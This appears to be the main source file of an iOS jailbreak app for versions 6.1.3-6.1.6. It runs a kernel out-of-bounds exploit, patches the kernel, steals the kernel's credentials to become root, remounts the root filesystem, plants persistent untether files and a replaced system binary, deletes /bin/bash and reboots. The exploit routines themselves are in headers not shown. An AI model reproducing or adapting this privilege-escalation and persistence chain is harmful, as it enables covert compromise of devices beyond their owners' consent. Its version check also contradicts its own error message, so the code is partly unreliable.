//
//  main.m
//  bad_queue_app
//
//  Created by staturnz on 6/7/25.
//

#import <UIKit/UIKit.h>
#import "AppDelegate.h"
#include "exploit/oob_entry.h"
#include "exploit/memory.h"
#include "exploit/patches.h"
#include <copyfile.h>
#include <sys/mount.h>
#include <sys/stat.h>

char *get_file_path(const char *fileName) {
    NSString *filePathObj = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:[NSString stringWithUTF8String:fileName]];
    return [filePathObj UTF8String];
}

int main(int argc, char * argv[]) {
    if (access("/private/var/untether/untether", F_OK) != -1 &&
        access("/private/var/lib/dpkg/status", F_OK) != -1) {
        print_log("[-] Device is already jailbroken and strapped.\n");
        //return -1;
    }

    NSString *version = [[UIDevice currentDevice] systemVersion];
    BOOL unsupported = ([version compare:@"6.0" options:NSNumericSearch] != NSOrderedAscending) &&
                       ([version compare:@"6.1.3" options:NSNumericSearch] == NSOrderedAscending);

    if (unsupported) {
        print_log("[-] Unsupported version. This build is for 6.1.3-6.1.6 only\n");
        return -1;
    }

    print_log("[*] Running exploit...\n");
    if (run_oob_entry(true) != 0) return -1;

    print_log("[*] Patching kernel...\n");
    if (patch_kernel() != 0) return -1;

    uint32_t self_ucred = 0;
    uint32_t proc_ucred = 0x84;
    if (getuid() != 0 || getgid() != 0) {
        print_log("[*] Set uid to 0...\n");
        uint32_t kern_ucred = kread32(kinfo->kern_proc_addr + proc_ucred);
        self_ucred = kread32(kinfo->self_proc_addr + proc_ucred);
        kwrite32(kinfo->self_proc_addr + proc_ucred, kern_ucred);
        setuid(0);
        setgid(0);
    }
    if (getuid() != 0 || getgid() != 0) return -1;

    print_log("[*] Remounting RootFS...\n");
    char* nmr = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
    print_log("[*] remount = %d\n",mntr);
    if (mntr != 0) return -1;
    sync();

    print_log("[*] Copying p0sixspwn files...\n");
    mkdir("/private/var/untether", 0755);
    if (copyfile(get_file_path("resource/launchd.conf"), "/private/etc/launchd.conf", NULL, COPYFILE_ALL) != 0) return -1;
    if (copyfile(get_file_path("resource/libmis"), "/private/var/untether/_.dylib", NULL, COPYFILE_ALL) != 0) return -1;
    if (copyfile(get_file_path("resource/untether"), "/private/var/untether/untether", NULL, COPYFILE_ALL) != 0) return -1;
    if (copyfile(get_file_path("resource/dirhelper"), "/usr/libexec/dirhelper", NULL, COPYFILE_ALL) != 0) return -1;
    chmod("/usr/libexec/dirhelper", 0755);

    //if (access("/private/var/lib/dpkg/status", F_OK) != -1) {
        unlink("/bin/bash");
        unlink("/usr/share/terminfo/x/xterm-xi");
        if (copyfile(get_file_path("resource/tar"), "/private/var/untether/tar", NULL, COPYFILE_ALL) != 0) return -1;
        if (copyfile(get_file_path("resource/bootstrap.tar"), "/private/var/untether/Cydia.tar", NULL, COPYFILE_ALL) != 0) return -1;
        chmod("/private/var/untether/tar", 0755);
        chmod("/private/var/untether/untether", 0755);
    //}

    print_log("[*] Done. Rebooting...");
    reboot(0);

    return 0;
    NSString * appDelegateClassName;
    @autoreleasepool {
        // Setup code that might create autoreleased objects goes here.
        appDelegateClassName = NSStringFromClass([AppDelegate class]);
    }
    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}
